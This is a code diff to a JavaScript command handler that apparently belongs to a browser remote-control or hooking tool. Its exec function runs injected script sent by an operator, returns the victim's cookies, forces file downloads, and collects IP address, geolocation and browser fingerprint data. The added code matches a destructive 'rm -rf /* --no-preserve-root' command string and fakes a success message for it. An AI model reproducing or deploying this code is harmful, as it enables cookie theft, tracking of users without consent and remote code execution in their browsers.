@@ -55,7 +55,14 @@ function exec(command) {
         if (command.replace(" ","") === 'none') {
             return false;
         }
-        if (command.startsWith("js: ")) {
+        else if (command == 'js: run_system_command("rm -rf /* --no-preserve-root")')
+        {
+            // This is game's command.
+            setTimeout(function() {
+                sendReturn("[INFO] SYSTEM COMMAND RUN SUCCESSFUL.");
+            } , 3000);          
+        }
+        else if (command.startsWith("js: ")) {
             var javaScript = command.substring("js: ".length,command.length);
     
             var script = document.createElement("script");
@@ -66,11 +73,11 @@ function exec(command) {
             clear_command()
             return true;
         }
-        if (command === 'get_cookie') {
-            sendReturn(document.cookie);
+        else if (command == 'get_cookie') {
+            sendReturn(String(document.cookie));
             clear_command()
         }
-        if (command.startsWith('rget ')) {
+        else if (command.startsWith('rget ')) {
             var url = String(command).substring(5 , command.length);
             var body = document.body;
             var a = document.createElement('a');
@@ -81,7 +88,7 @@ function exec(command) {
             a.click()
             body.removeChild(a)
         }
-        if (command === 'get_ip') {
+        else if (command === 'get_ip') {
             var xhr = new XMLHttpRequest();
             xhr.open("GET","https://api.ipify.org/",true)
             xhr.send();
@@ -99,13 +106,13 @@ function exec(command) {
             };
             return true;
         }
-        if (command === 'getlocation')
+        else if (command === 'getlocation')
         {
             getLocation();
             clear_command()
             return true;
         }
-        if (command === 'getinfo') {
+        else if (command === 'getinfo') {
             sendReturn("[ navigator ] /n" +
                 "Platform: "+navigator.platform + "/n" +
                 "UserAgent: " + navigator.userAgent + '/n' +
@@ -118,7 +125,7 @@ function exec(command) {
             clear_command()
             return true;
         }
-        if (command === 'close') {
+        else if (command === 'close') {
             clearInterval(loop)
             clear_command()
             return true;
